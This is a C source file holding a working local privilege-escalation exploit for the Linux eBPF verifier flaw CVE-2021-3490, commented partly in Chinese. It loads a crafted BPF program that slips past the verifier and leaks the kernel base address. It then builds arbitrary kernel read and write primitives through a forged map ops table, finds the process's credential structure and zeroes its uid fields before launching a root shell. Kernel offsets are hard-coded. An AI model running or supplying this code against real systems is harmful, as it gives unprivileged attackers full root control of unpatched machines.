#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <stddef.h>

#ifndef __NR_BPF
#define __NR_BPF 321
#endif
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){                        \
        .code = CODE,                          \
        .dst_reg = DST,                        \
        .src_reg = SRC,                        \
        .off = OFF,                            \
        .imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)    \
    ((struct bpf_insn){                    \
        .code = BPF_LD | BPF_DW | BPF_IMM, \
        .dst_reg = DST,                    \
        .src_reg = SRC,                    \
        .off = 0,                          \
        .imm = (__u32)(IMM)}),             \
        ((struct bpf_insn){                \
            .code = 0,                     \
            .dst_reg = 0,                  \
            .src_reg = 0,                  \
            .off = 0,                      \
            .imm = ((__u64)(IMM)) >> 32})

#define BPF_ALU64_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
#define BPF_ALU_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
#define BPF_ALU64_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)
#define BPF_ALU_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_MOV_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_MOV64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_MOV_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_RSH_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)
#define BPF_LSH_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)
#define BPF_JMP_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)
#define BPF_JMP32_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)
#define BPF_JMP32_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)
#define BPF_ST_MEM(SIZE, DST, OFF, IMM) BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
#define BPF_STX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
#define BPF_LD_ABS(SIZE, IMM) BPF_RAW_INSN(BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, 0, 0, 0, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD) BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define LOG_BUF_SIZE 65536

int doredact = 0;
char bpf_log_buf[LOG_BUF_SIZE];
char buffer[64];
int sockets[2];
int mapfd;

void fail(const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    fprintf(stdout, "[!] ");
    vfprintf(stdout, fmt, args);
    va_end(args);
    exit(1);
}

void redact(const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    if (doredact)
    {
        fprintf(stdout, "[!] ( ( R E D A C T E D ) )\n");
        return;
    }
    fprintf(stdout, "[*] ");
    vfprintf(stdout, fmt, args);
    va_end(args);
}

void msg(const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    fprintf(stdout, "[*] ");
    vfprintf(stdout, fmt, args);
    va_end(args);
}

int bpf_create_map(enum bpf_map_type map_type,
                   unsigned int key_size,
                   unsigned int value_size,
                   unsigned int max_entries)
{
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries};

    return syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
    };

    return syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int bpf_update_elem(int fd, const void *key, const void *value,
                    uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
        .flags = flags,
    };

    return syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int bpf_prog_load(enum bpf_prog_type type,
                  const struct bpf_insn *insns, int insn_cnt,
                  const char *license)
{
    union bpf_attr attr = {
        .prog_type = type,
        .insns = ptr_to_u64(insns),
        .insn_cnt = insn_cnt,
        .license = ptr_to_u64(license),
        .log_buf = ptr_to_u64(bpf_log_buf),
        .log_size = LOG_BUF_SIZE,
        .log_level = 1,
    };

    return syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));
}

int bpf_obj_get_info_by_fd(int fd, const unsigned int info_len, void *info)
{
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.info.bpf_fd = fd;
    attr.info.info_len = info_len;
    attr.info.info = ptr_to_u64(info);
    return syscall(__NR_BPF, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
}

// BPF_REG_9 = mapfd
// dst = BPF_FUNC_map_lookup_elem(BPF_REG_9,idx)
// BPF_REG_1、BPF_REG_2、BPF_REG_0、*(BPF_REG_10-4) wii be changed during BPF_MAP_GET/BPF_MAP_GET_ADDR
#define BPF_MAP_GET(idx, dst)                                                \
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \
        BPF_EXIT_INSN(),                                                     \
        BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                              \
        BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)                                           \
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \
        BPF_EXIT_INSN(),                                                     \
        BPF_MOV64_REG((dst), BPF_REG_0),                                     \
        BPF_MOV64_IMM(BPF_REG_0, 0)

#define OFF_ARRAY_MAP_OPS 0x10363e0
#define OFF_STACK_MAP_OPS 0x10367e0
#define OFF_INIT_PID_NS 0x1a6b2c0
#define OFF_BPF_ARRAY_VALUE 0x110
#define OFF_BPF_ARRAY_MAP_OPS 0x0
#define OFF_BPF_ARRAY_MAP_BTF 0x40
#define OFF_BTF_ID 0x58
#define OFF_BPF_MAP_INFO_BTF_ID 0x40
#define OFF_BPF_ARRAY_MAP_FREEZE_MUTEX_WAIT_LIST 0xc0
#define OFF_BPF_ARRAY_MAP_MAP_TYPE 0x18
#define OFF_BPF_ARRAY_MAP_MAX_ENTRIES 0x24
#define OFF_BPF_ARRAY_MAP_SPIN_LOCK_OFF 0x2c
#define OFF_BPF_MAP_OPS_MAP_PUSH_ELEM 0x70
#define OFF_BPF_MAP_OPS_MAP_GET_NEXT_KEY 0x20
#define OFF_PID_NAMESPACE_CHILD_REAPER 0x30
#define OFF_TASK_STRUCT_PID 0x918
#define OFF_TASK_STRUCT_CRED 0xad8
#define OFF_TASK_STRUCT_TASKS_NEXT 0x818

int load_prog()
{
    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_9, mapfd),              // r9 = 0x0
                                                      // trigger vulnerability of CVE-2021-3490
        BPF_LD_IMM64(BPF_REG_8, 0x1),                 // r8 = 0x1
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_8, 32),        // r8 <<= 32     	0x10000 0000
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 2),         // r8 += 2       	0x10000 0002
        BPF_MAP_GET(0, BPF_REG_5),                    // r5 = *(u64 *)(r0 +0)
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_5),          // r6 = r5
        BPF_LD_IMM64(BPF_REG_2, 0xFFFFFFFF),          // r2 = 0xffffffff
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),        // r2 <<= 32 		0xFFFFFFFF00000000
        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_2), // r6 &= r2          高32位 unknown, 低32位known value = 0
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),         // r6 += 1    		mask = 0xFFFFFFFF00000000, value = 0x1
        // trigger the vulnerability
        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_8), // r6 &= r8 		r6: u32_min_value=1, u32_max_value=0
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),         // r6 += 1 		r6: u32_max_value = 1, u32_min_value = 2, var_off = {0x100000000; value = 0x1}
        BPF_JMP32_IMM(BPF_JLE, BPF_REG_5, 1, 1),      // if w5 <= 0x1 goto pc+1   r5: u32_min_value = 0, u32_max_value = 1, var_off = {mask = 0xFFFFFFFF00000001; value = 0x0}
        BPF_EXIT_INSN(),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_5), // r6 += r5 		r6: verify:2   fact:1
        BPF_MOV_REG(BPF_REG_6, BPF_REG_6),            // w6 = w6 		对64位进行截断，只看32位部分
        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 1),         // r6: verify:0   fact:1

        // get option(value[1])
        BPF_MAP_GET(1, BPF_REG_7),    
                                                            // r7 = *(u64 *)(r0 +0)
        //[option 0] leak kaslr : 读取bpf_array->map->ops指针，先获取bpf_array->value的地址，减去value的偏移，加ops的偏移，读出来的地址存放在value[4]
        BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 0, 23),                                           // if r7 != 0x0 goto pc+23
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, (OFF_BPF_ARRAY_VALUE - OFF_BPF_ARRAY_MAP_OPS)), // r6 = bpf_array->map->ops offset
        BPF_MAP_GET_ADDR(0, BPF_REG_7),                                                   // r7 = &value[0]
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),                                     // r7 -= r6
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),                                     // r8 = *(u64 *)(r7 +0)
        BPF_MAP_GET_ADDR(4, BPF_REG_6),                                                   // r6 = &value[4]
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                                     // *(u64 *)(r6 +0) = r8
        BPF_EXIT_INSN(),

        //[option 1] 构造任意地址读4字节 : 这里篡改 bpf_array->map->btf 为 target_addr减去offset(btf->id)，用户态再利用 bpf_map_get_info_by_fd 泄露 map->btf加offset(btf->id)地址处的4字节
        BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 1, 22),                                           // if r7 != 0x1 goto pc+22
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, (OFF_BPF_ARRAY_VALUE - OFF_BPF_ARRAY_MAP_BTF)), // r6 = bpf_array->map->btf offset
        BPF_MAP_GET_ADDR(0, BPF_REG_7),                                                   // r7 = &value[0]
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),                                     // r7 -= r6
        BPF_MAP_GET(2, BPF_REG_8),                                                        // r8 = &value[2] value[2] 提前传入 target_addr减去offset(btf->id)
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),                                     // *(u64 *)(r7 +0) = r8
        BPF_EXIT_INSN(),

        //[option 2] leak &value : bpf_array->map->freeze_mutex->wait_list 指向wait_list自身，读出来的地址存放在value[4]
        BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 2, 23),                                                              // if r7 != 0x2 goto pc+22
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, (OFF_BPF_ARRAY_VALUE - OFF_BPF_ARRAY_MAP_FREEZE_MUTEX_WAIT_LIST)), // r6 = wait_list offset
        BPF_MAP_GET_ADDR(0, BPF_REG_7),                                                                      // r7 = &value[0]
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),                                                        // r7 -= r6
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),                                                        // r8 = *(u64 *)(r7 +0)
        BPF_MAP_GET_ADDR(4, BPF_REG_6),                                                                      // r6 = &value[4]
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                                                        // *(u64 *)(r6 +0) = r8
        BPF_EXIT_INSN(),

        //[option 3] write ops and change type : 任意地址写，篡改 bpf_array->map->ops 函数表指针= fake_ops的地址，还要构造 map 的3个字段:bpf_array->map->map_type=0x17; bpf_array->map->max_entries=-1; bpf_array->map->spin_lock_off=0;
        BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 3, 60),                                                     // if r7 != 0x3 goto pc+60
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),                                                        // r8 = r6
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, (OFF_BPF_ARRAY_VALUE - OFF_BPF_ARRAY_MAP_OPS)),           // r6 = ops offset
        BPF_MAP_GET_ADDR(0, BPF_REG_7),                                                             // r7 = &value[0]
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),                                               // r7 -= r6
        BPF_MAP_GET(2, BPF_REG_6),                                                                  // r6 = value[2]      	传入 fake_ops 地址
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),                                               // *(r7+0) = r6    	  	篡改 bpf_array->map->ops = fake_ops 地址
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_8),                                                        // r6 = r8			  	恢复r6
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, (OFF_BPF_ARRAY_VALUE - OFF_BPF_ARRAY_MAP_MAP_TYPE)),      // r8 = map_type offset
        BPF_MAP_GET_ADDR(0, BPF_REG_7),                                                             // r7 = &value[0]
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),                                               // r7 -= r8
        BPF_ST_MEM(BPF_W, BPF_REG_7, 0, BPF_MAP_TYPE_STACK),                                        // *(r7+0) = 0x17  bpf_array->map->map_type (0x18) 改为 BPF_MAP_TYPE_STACK (0x17)
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),                                                        // r8 = r6
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, (OFF_BPF_ARRAY_VALUE - OFF_BPF_ARRAY_MAP_MAX_ENTRIES)),   // r6 = max_entries offset
        BPF_MAP_GET_ADDR(0, BPF_REG_7),                                                             // r7 = &value[0]
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),                                               // r7 -= r6
        BPF_ST_MEM(BPF_W, BPF_REG_7, 0, -1),                                                        // *(r7+0) = -1			bpf_array->map->max_entries 改为0xffffffff
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, (OFF_BPF_ARRAY_VALUE - OFF_BPF_ARRAY_MAP_SPIN_LOCK_OFF)), // r8 = spin_lock_off offset
        BPF_MAP_GET_ADDR(0, BPF_REG_7),                                                             // r7 = &value[0]
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),                                               // r7 = r7 - r8
        BPF_ST_MEM(BPF_W, BPF_REG_7, 0, 0),                                                         // *(r7+0) = 0		 	bpf_array->map->spin_lock_off 改为 0
        BPF_EXIT_INSN(),
    };
    return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}

// write_msg() —— trigger to execute eBPF code
int write_msg()
{
    ssize_t n = write(sockets[0], buffer, sizeof(buffer));
    if (n < 0)
    {
        perror("write");
        return 1;
    }
    if (n != sizeof(buffer))
    {
        fprintf(stderr, "short write: %d\n", n);
    }
    return 0;
}

void update_elem(int key, size_t val)
{
    if (bpf_update_elem(mapfd, &key, &val, 0))
    {
        fail("bpf_update_elem failed '%s'\n", strerror(errno));
    }
}

size_t get_elem(int key)
{
    size_t val;
    if (bpf_lookup_elem(mapfd, &key, &val))
    {
        fail("bpf_lookup_elem failed '%s'\n", strerror(errno));
    }
    return val;
}

size_t read64(size_t addr)
{
    uint32_t low32, high32;
    char btf[0x50] = {0};
    update_elem(0, 0);
    update_elem(1, 1);
    update_elem(2, addr - OFF_BTF_ID); // value[2] 传入 target_addr-OFF_BTF_ID
    write_msg();
    if (bpf_obj_get_info_by_fd(mapfd, sizeof(btf), btf))
    {
        fail("bpf_obj_get_info_by_fd failed '%s'\n", strerror(errno));
    }
    low32 = *(unsigned int *)&btf[OFF_BPF_MAP_INFO_BTF_ID];
    update_elem(2, addr - OFF_BTF_ID + 4);
    write_msg();
    if (bpf_obj_get_info_by_fd(mapfd, sizeof(btf), btf))
    {
        fail("bpf_obj_get_info_by_fd failed '%s'\n", strerror(errno));
    }
    high32 = *(unsigned int *)&btf[OFF_BPF_MAP_INFO_BTF_ID];
    return (((size_t)high32) << 32) | low32;
}

void clear_btf()
{
    update_elem(0, 0);
    update_elem(1, 1);
    update_elem(2, 0);
    write_msg();
}

void write32(size_t addr, uint32_t data)
{
    uint64_t key = 0;
    data -= 1;
    if (bpf_update_elem(mapfd, &key, &data, addr))
    {
        fail("bpf_update_elem failed '%s'\n", strerror(errno));
    }
}

void write64(size_t addr, size_t data)
{
    uint32_t low32 = data & 0xffffffff;
    uint32_t high32 = (data & 0xffffffff00000000) >> 32;
    uint64_t key = 0;
    write32(addr, low32);
    write32(addr + 4, high32);
}

int main()
{
    // Step 1: create eBPF code, verify and trigger the vulnerability
    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 0x100);
    if (mapfd < 0)
    {
        fail("failed to create map '%s'\n", strerror(errno));
    }
    redact("sneaking evil bpf past the verifier\n");
    int progfd = load_prog(); // verify
    printf("%s\n", bpf_log_buf);
    if (progfd < 0)
    {
        if (errno == EACCES)
        {
            msg("log:\n%s", bpf_log_buf);
        }
        printf("%s\n", bpf_log_buf);
        fail("failed to load prog '%s'\n", strerror(errno));
    }

    redact("creating socketpair()\n");
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
    {
        fail("failed to create socket pair '%s'\n", strerror(errno));
    }

    redact("attaching bpf backdoor to socket\n");
    if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
    {
        fail("setsockopt '%s'\n", strerror(errno));
    }

    // Step 2: leak kernel_base  [option 0]
    update_elem(0, 0);
    update_elem(1, 0);
    write_msg();
    size_t ops_addr = get_elem(4); 
    printf("leak addr: 0x%llx\n", ops_addr); 
    size_t linux_base = ops_addr - OFF_ARRAY_MAP_OPS;
    printf("linux base: 0x%llx\n", linux_base);

    // Step 3: construct fake_ops with bpf_array->map->ops->map_push_elem = map_get_next_key
#define fake_ops_offset 0x50 //在 &value[0]+0x50处伪造 bpf_array->map->ops 函数表
    char ops[0xe8] = {0};
    for (int i = 0; i < 0xe8; i += 8)
    {
        *(size_t *)&ops[i] = read64(ops_addr + i);
        update_elem((fake_ops_offset + i) / 8, *(size_t *)&ops[i]);
    }
    size_t data = read64(ops_addr);
    update_elem((fake_ops_offset + OFF_BPF_MAP_OPS_MAP_PUSH_ELEM) / 8, *(size_t *)&ops[OFF_BPF_MAP_OPS_MAP_GET_NEXT_KEY]);

    // Step 4: leak value addr (leak bpf_array->map->freeze_mutex->wait_list) [option 2]
    update_elem(0, 0);
    update_elem(1, 2);
    write_msg();
    size_t heap_addr = get_elem(4);
    size_t values_addr = heap_addr + (OFF_BPF_ARRAY_VALUE - OFF_BPF_ARRAY_MAP_FREEZE_MUTEX_WAIT_LIST);
    printf("value addr: 0x%llx\n", values_addr);

    // Step 5: leak task_struct addr [option 1]
    size_t init_pid_ns = linux_base + OFF_INIT_PID_NS;
    printf("init_pid_ns addr: 0x%llx\n", init_pid_ns);
    pid_t pid = getpid();
    printf("self pid is %d\n", pid);
    size_t task_addr = read64(init_pid_ns + OFF_PID_NAMESPACE_CHILD_REAPER); //init_pid_ns ->child_reaper 存放 task_struct 地址（real_cred 和 cred 地址相同）
    printf("task_struct addr: 0x%llx\n", task_addr);

    // Step 6: leak cred addr [option 1] 遍历 task_struct->tasks->next 链表，读取指定线程的cred地址
    size_t cred_addr = 0;
    while (1)
    {
        pid_t p = read64(task_addr + OFF_TASK_STRUCT_PID);
        printf("iter pid %d ...\n", p);
        if (p == pid)
        {
            puts("got it!");
            cred_addr = read64(task_addr + OFF_TASK_STRUCT_CRED);
            break;
        }
        else
        {
            task_addr = read64(task_addr + OFF_TASK_STRUCT_TASKS_NEXT) - OFF_TASK_STRUCT_TASKS_NEXT;
            printf("[+] iter task %p ...\n", task_addr);
        }
    }

    // Step 7: change cred [option 3]
    printf("get cred_addr 0x%llx\n", cred_addr);
    size_t cred_usage = read64(cred_addr);
    printf("cred->usage: %d\n", cred_usage);
    clear_btf();
    update_elem(0, 0);
    update_elem(1, 3);
    update_elem(2, values_addr + fake_ops_offset);
    write_msg();               
    write32(cred_addr + 4, 0); // 篡改cred
    write64(cred_addr + 8, 0);
    write64(cred_addr + 16, 0);
    if (getuid() == 0)
    {
        puts("getting shell!");
        system("/bin/sh");
    }
}
